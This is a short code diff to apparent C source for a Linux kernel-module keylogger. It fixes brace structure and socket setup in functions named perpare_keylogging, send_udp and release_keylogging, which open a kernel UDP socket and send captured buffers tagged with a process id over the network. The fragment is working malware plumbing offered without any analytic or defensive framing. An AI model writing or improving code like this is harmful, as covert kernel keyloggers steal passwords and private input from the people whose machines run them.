@@ -19,7 +19,9 @@ char message[MESSAGE_SIZE];
 
 void perpare_keylogging(void){
 if (sock_init){
-{
+  printk(KERN_DEBUG "Socket aready exits. Release it!\n");
+  release_keylogging(); 
+}
   /* Creating socket */
   error = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
   if (error<0)
@@ -43,8 +45,7 @@ if (sock_init){
   msg.msg_control = NULL;
   sock_init = 1;
 }
-}
-}
+
 void send_udp(int pid, char * buf){
   if(sock_init){
 /* Sending a message */
@@ -59,6 +60,7 @@ error = sock_sendmsg(sock,&msg,len);
 set_fs(old_fs);
 }
 }
+
 void release_keylogging(void){
   if(sock_init){
     sock_release(sock);
